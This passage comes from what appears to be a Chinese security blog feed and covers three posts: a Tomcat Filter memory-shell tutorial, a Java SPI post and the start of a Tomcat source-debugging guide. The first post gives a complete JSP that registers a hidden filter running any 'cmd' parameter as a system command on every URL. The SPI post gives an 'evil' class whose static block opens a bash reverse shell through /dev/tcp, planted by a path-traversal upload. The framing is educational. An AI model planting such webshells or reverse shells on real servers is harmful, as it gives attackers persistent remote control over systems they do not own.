class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/21 10:41</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@WebFilter(filterName = &quot;FilterTest&quot;, urlPatterns = &#123;&quot;/*&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterTest</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(cmd != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">                <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">while</span>((a = inputStream.read(bytes))!=-<span class="number">1</span>)&#123;</span><br><span class="line">                    bao.write(bytes, <span class="number">0</span>, a);</span><br><span class="line">                &#125;</span><br><span class="line">                servletResponse.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bao.toByteArray()));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 使下一个 Filter 能够继续执行</span></span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>访问后带上参数执行命令<br><img src="images/image-20221031113025485.png" alt="image-20221031113025485"></p><p>在<code>doFilter()</code>处方法打上断点，看看调用栈<br><img src="images/image-20221031144738930.png" alt="image-20221031144738930"></p><p>从<code>StandardWrapperValve#invoke()</code>方法跟起<br><img src="images/image-20221031144936619.png" alt="image-20221031144936619"></p><p>首先通过<code>ApplicationFilterFactory.createFilterChain()</code>方法创建了一个<code>ApplicationFilterChain</code>类型对象，跟进<code>createFilterChain()</code>方法<br><img src="images/image-20221031145633764.png" alt="image-20221031145633764"></p><p>初始化了<code>ApplicationFilterChain</code>对象，继续往下走<br><img src="images/image-20221031161929404.png" alt="image-20221031161929404"></p><p>接下来获取到了<code>StandardContext</code>类对象<code>context</code>，并通过<code>context.findFilterMaps()</code>方法拿到了<code>filterMaps</code>数组，继续往下走<br><img src="images/image-20221031162125403.png" alt="image-20221031162125403"></p><p>在 if 条件中，请求路径和<code>filterMap</code>设置的规则进行匹配，如果满足则进入 if 条件中，接着根据<code>filterMap</code>对象中存储的<code>filter</code>名称在<code>StandardContext</code>类的<code>filterConfigs</code>寻找<code>filterConfig</code>，如果不为空则通过<code>addFilter()</code>方法添加到<code>filterChain</code>的属性中<br><img src="images/image-20221031162208826.png" alt="image-20221031162208826"></p><p><code>addFilter()</code>方法源码如上图所示，代码逻辑就是进行了去重、扩容并添加<code>filterConfig</code>。</p><p>最后回到<code>StandardWrapperValve</code>类中往下走<br><img src="images/image-20221031151815580.png" alt="image-20221031151815580"></p><p>跟进<code>filterChain.doFilter()</code>方法中<br><img src="images/image-20221031151928083.png" alt="image-20221031151928083"></p><p>继续跟进<code>internalDoFilter()</code>方法<br><img src="images/image-20221031152051403.png" alt="image-20221031152051403"></p><p>创建了<code>ApplicationFilterConfig</code>类对象<code>filterConfig</code>，然后通过<code>filterConfig.getFilter()</code>方法取出<code>filter</code>，接着调用<code>filter.doFilter()</code>方法，跟进后就是我们编写的恶意类<code>FilterTest</code><br><img src="images/image-20221031152224431.png" alt="image-20221031152224431"></p><p>至此步骤算是走完了，总结一下流程：</p><ol><li>通过<code>ApplicationFilterFactory.createFilterChain()</code>方法初始化<code>ApplicationFilterChain</code>对象；<ul><li>初始化空的<code>ApplicationFilterChain</code>对象；</li><li>获取<code>StandardContext</code>类对象，并中<code>StandardContext</code>类对象中取出<code>FilterMaps</code>数组,<code>FilterMaps</code>数组中的<code>FilterMap</code>存储名称和匹配规则；</li><li>根据<code>FilterMap</code>的名称在<code>StandardContext</code>类的<code>filterConfigs</code>中查找，如果不为空则添加到<code>filterChain</code>对象的属性中；</li></ul></li><li>执行<code>filterChain#doFilter()</code>方法进入编写的恶意实现类<code>FilterTest</code>的<code>doFilter()</code>方法中执行代码。</li></ol><p>接下来再看看<code>Filter</code>的初始化加载流程，把断点打在类名处<br><img src="images/image-20221031160325554.png" alt="image-20221031160325554"></p><p>看看调用栈<br><img src="images/image-20221031160352961.png" alt="image-20221031160352961"></p><p>跟进<code>filterStart()</code>方法<br><img src="images/image-20221031161602064.png" alt="image-20221031161602064"></p><p>遍历 Map 对象<code>filterDefs</code>并获取到<code>entry.getValue()</code>，作为参数传入初始化的<code>ApplicationFilterConfig</code>对象<code>filterConfig</code>，然后通过<code>put()</code>方法把<code>filterConfig</code>添加到<code>filterConfigs</code>中。</p><p>至此我们知道和 filter 有关的三个字段分别为：<code>filterMaps</code>、<code>filterDefs</code>和<code>filterConfigs</code></p><h2 id="Filter内存马的实现"><a href="#Filter内存马的实现" class="headerlink" title="Filter内存马的实现"></a>Filter内存马的实现</h2><p>我们先总结一下这三个字段存储的内容</p><h3 id="filterMaps"><a href="#filterMaps" class="headerlink" title="filterMaps"></a>filterMaps</h3><p><img src="images/image-20221031163323171.png" alt="image-20221031163323171"></p><p>可以看到在<code>filterMaps</code>中以数组的方式存储着 filter 的名称和路径映射信息，其中<code>dispatcherMapping</code>、<code>filterName</code>和<code>urlPatterns</code>是必须的。</p><h3 id="filterDefs"><a href="#filterDefs" class="headerlink" title="filterDefs"></a>filterDefs</h3><p><img src="images/image-20221031163520399.png" alt="image-20221031163520399"></p><p><code>filterDefs</code>以键值对的方式存储<code>filterDef</code>，<code>filterDef</code>为 Map 对象，value 存储着重要的<code>filter</code>、<code>filterClass</code>和<code>filterName</code>。</p><h3 id="filterConfigs"><a href="#filterConfigs" class="headerlink" title="filterConfigs"></a>filterConfigs</h3><p><img src="images/image-20221031164103231.png" alt="image-20221031164103231"></p><p><code>filterConfigs</code>存储着当前的上下文<code>StandardContext</code>（WEB 应用），<code>filter</code>对象和<code>filterDef</code>等等信息。</p><p>经过前面的分析，我们可以通过控制上述三个属性的内容达到动态添加恶意 Filter 的目的， 思路如下：</p><ol><li>编写恶意的 Filter 实现类；</li><li>获取<code>StandardContext</code>对象；</li><li>利用<code>FilterDef</code>对<code>filter</code>进行封装；</li><li>创建<code>FilterMap</code>，将<code>filterName</code>和<code>urlPatterns</code>进行绑定（因为 Filter 是按照先后顺序进行调用，所以我们最好把恶意 Filter 放到最前面）</li><li>使用<code>ApplicationFilterConfig</code>封装<code>filterDef</code>，然后将其添加到<code>filterConfigs</code>中</li></ol><p>最后 Filter 内存马实现如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.ByteArrayOutputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;&lt;%--</span><br><span class="line">  Created by dotast on <span class="number">2022</span>/<span class="number">10</span>/<span class="number">31</span> <span class="number">16</span>:<span class="number">51</span></span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">FilterTest</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(cmd != <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                    <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">                    <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                    <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">while</span>((a = inputStream.read(bytes))!=-<span class="number">1</span>)&#123;</span><br><span class="line">                        bao.write(bytes, <span class="number">0</span>, a);</span><br><span class="line">                    &#125;</span><br><span class="line">                    servletResponse.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bao.toByteArray()));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 使下一个 Filter 能够继续执行</span></span><br><span class="line">            filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">&quot;FilterTest&quot;</span>;</span><br><span class="line">    <span class="comment">// 获取StandardContext对象</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) field.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 利用FilterDef对filter进行封装</span></span><br><span class="line">    <span class="type">FilterTest</span> <span class="variable">filterTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterTest</span>();</span><br><span class="line">    <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">    filterDef.setFilter(filterTest);</span><br><span class="line">    filterDef.setFilterName(filterName);</span><br><span class="line">    filterDef.setFilterClass(filterTest.getClass().getName());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建FilterMap，将filterName和urlPatterns进行绑定</span></span><br><span class="line">    <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">    filterMap.setFilterName(filterName);</span><br><span class="line">    filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">    filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">    standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 封装filterConfig和filterDef到filterConfigs</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">field_filterConfigs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    field_filterConfigs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) field_filterConfigs.get(standardContext);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 利用反射创建FilterConfig，并且将filterDef和standardContext作为参数进行传入进行封装filterDe</span></span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">    constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationFilterConfig</span> <span class="variable">applicationFilterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加到filterConfigs中</span></span><br><span class="line">    filterConfigs.put(filterName,applicationFilterConfig);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></p><p>访问上传的内存马文件路径使其执行代码，注册内存马<br><img src="images/image-20221031172346671.png" alt="image-20221031172346671"></p><p>接着访问其他路由都可以成功执行命令<br><img src="images/image-20221031172405231.png" alt="image-20221031172405231"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SPI机制</title>
      <link href="/2022/11/10/SPI%E6%9C%BA%E5%88%B6/"/>
      <url>/2022/11/10/SPI%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="SPI机制"><a href="#SPI机制" class="headerlink" title="SPI机制"></a>SPI机制</h1><blockquote><p>最开始接触是springboot写文件rce里面的charsets遇到了，然后发现yaml的反弹也是使用的SPI机制</p></blockquote><p>SPI全称Service Provider Interface，是Java提供的一套用来被第三方实现或者扩展的API，或者换句话说，<strong>SPI是一种服务发现机制</strong> </p><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><p>定义接口 SpiService.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.firebasky.spi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">SpiService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现接口的方法的类SpiServiceA.java (<strong>需要注意SPI机制的实现类必须有一个无参构造方法</strong>)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.firebasky.spi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpiServiceA</span> <span class="keyword">implements</span> <span class="title class_">SpiService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;SpiServiceA.Hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SpiServiceB.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.firebasky.spi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpiServiceB</span> <span class="keyword">implements</span> <span class="title class_">SpiService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;SpiServiceB.Hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SpiTest</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.firebasky.spi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.ServiceLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpiTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            init();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">        ServiceLoader&lt;SpiService&gt; serviceLoader = ServiceLoader.load(SpiService.class);</span><br><span class="line">        Iterator&lt;SpiService&gt; iterator = serviceLoader.iterator();</span><br><span class="line">        <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">            <span class="type">SpiService</span> <span class="variable">spiService</span> <span class="operator">=</span> iterator.next();</span><br><span class="line">            spiService.hello();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后定义META-INF/services<br><img src="https://user-images.githubusercontent.com/63966847/146678546-94e017c7-15a4-41f3-8082-4a0083c9b903.png" alt="image-20211219220826826"></p><p>然后run之后会输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SpiServiceA.Hello</span><br><span class="line">SpiServiceB.Hello</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>也就是我们可以通过spi机制去获得实现接口的类并且实例化去调用方法。</p><p>调用<strong>next方法</strong>的时候，实际调用到的是，lookupIterator.nextService。它通过反射的方式，创建实现类的实例并返回。</p><p><img src="https://user-images.githubusercontent.com/63966847/146678550-d158915b-fd15-4b20-a588-063ed76e7f8c.png" alt="image-20211219221208548"></p><p><img src="https://user-images.githubusercontent.com/63966847/146678553-aede21be-261d-4077-9f21-a5ca8d60c4ec.png" alt="image-20211219221324358"></p><p>需要注意一点如何获得 <strong>cn</strong>这个变量勒，也就是spi实例化什么东西？这个其实是在 <strong>META-INF/services/com.firebasky.spi.SpiService</strong>中配置的。</p><h2 id="新思路"><a href="#新思路" class="headerlink" title="新思路"></a>新思路</h2><p>那问题来了？</p><p><strong>环境存在路径穿越上传文件会造成rce?</strong> 会的。</p><p>如何实现？</p><p>我们上传META-INF/services/com.firebasky.spi.SpiService文件并且覆盖其中的值，写入我们的恶意类的全类名比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.firebasky.spi.evil</span><br></pre></td></tr></table></figure><p>然后我们在target\classes\下上传我们的evil.class，然后让其在一次的执行spi的操作。就可以成功rce.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#evil.java</span><br><span class="line"><span class="keyword">package</span> com.firebasky.spi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evial</span> <span class="keyword">implements</span> <span class="title class_">SpiService</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (IOException ee)&#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译成class 之后上传到target\classes\</p><p><img src="https://user-images.githubusercontent.com/63966847/146678561-9958bc94-f179-4440-97c4-fbdd2f7e03de.png" alt="image-20211219222014485"></p><p>在覆盖META-INF/services/com.firebasky.spi.SpiService</p><p><img src="https://user-images.githubusercontent.com/63966847/146678565-b5a349de-0fa3-4285-ae4c-3ce8a893bae7.png" alt="image-20211219222049642"></p><p>之后执行一下SpiTest。<br><img src="https://user-images.githubusercontent.com/63966847/146678572-60f7cfe5-32cf-4a40-9cca-b4a9d452d966.png" alt="image-20211219222131132"></p><p>其实也不是什么新思路,很多大师傅在实现写文件rce的时候就用到了,说不定ctf中可能遇到？？？</p><blockquote><p>参考： </p><p><a href="https://www.cnblogs.com/xrq730/p/11440174.html">https://www.cnblogs.com/xrq730/p/11440174.html</a></p><p><a href="https://www.jianshu.com/p/3a3edbcd8f24">https://www.jianshu.com/p/3a3edbcd8f24</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat源码调试</title>
      <link href="/2022/11/10/Tomcat%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/"/>
      <url>/2022/11/10/Tomcat%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="Tomcat源码调试"><a href="#Tomcat源码调试" class="headerlink" title="Tomcat源码调试"></a>Tomcat源码调试</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>后面的很多漏洞环境在调试的时候都需要步入 Tomcat 源码文件里，在步入的 class 反编译文件观感不佳（例如变量名丢失，变成了 var 1,2,3…诸如此类）。所以这里写篇笔记记录一下自己的配置过程和遇到的问题的解决方案（自己瞎鼓捣的，并非最好的解决方案），如果其他师傅有比较好的配置方法，欢迎分享学习学习。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>因为我的 Tomcat 版本是 9.0.65，所以我在官方下载的也是该版本的源码压缩包<br><img src="images/image-20221102104218124.png" alt="image-20221102104218124"></p><p>解压如下<br><img src="images/image-20221102104341694.png" alt="image-20221102104341694"></p><p>把 java 文件夹里的 javax 和 org 两个文件夹复制到创建的 Java 项目中<br><img src="images/image-20221102104454294.png" alt="image-20221102104454294"></p><p>在 pom.xml 里添加如下的 maven 依赖：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- tomcat source--&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;biz.aQute.bnd&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;biz.aQute.bndlib&lt;/artifactId&gt;</span><br><span 